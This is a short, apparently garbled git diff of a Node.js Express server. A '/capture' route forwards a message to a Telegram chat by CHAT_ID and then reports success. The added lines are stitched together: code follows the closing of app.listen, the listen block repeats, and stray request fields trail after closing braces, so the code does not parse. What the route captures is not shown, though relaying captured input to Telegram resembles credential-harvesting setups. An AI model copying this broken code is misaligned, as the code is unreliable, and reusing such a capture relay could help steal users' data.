@@ -50,6 +50,22 @@ app.post('/capture', async (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
+});            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "MarkdownV2"
+            })
+        });
+        console.log("✅ Sent to Telegram");
+    } catch (err) {
+        console.error("❌ Telegram error:", err.message);
+    }
+
+    res.json({ success: true });
+});
+
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
 });            method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
